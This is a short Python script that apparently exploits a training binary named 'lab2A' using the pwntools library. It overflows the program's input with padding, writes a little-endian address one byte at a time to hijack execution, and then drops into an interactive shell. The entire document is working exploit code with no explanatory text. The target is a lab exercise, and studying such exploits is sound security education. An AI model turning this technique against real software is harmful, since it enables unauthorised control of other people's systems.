#!/usr/bin/python
from pwn import *
import tty

def main():
    breakloop = "A" * 12
    p = process('./lab2A', stdin=PTY, stderr=open('/dev/null', 'w+'), raw=False)
    p.recvuntil(":")
    p.sendline(breakloop)
    for i in range(23):
        p.sendline("B")
    p.sendline("\xfd")
    p.sendline("\x86")
    p.sendline("\x04")
    p.sendline("\x08")
    p.interactive()

if __name__ == "__main__":
    main()
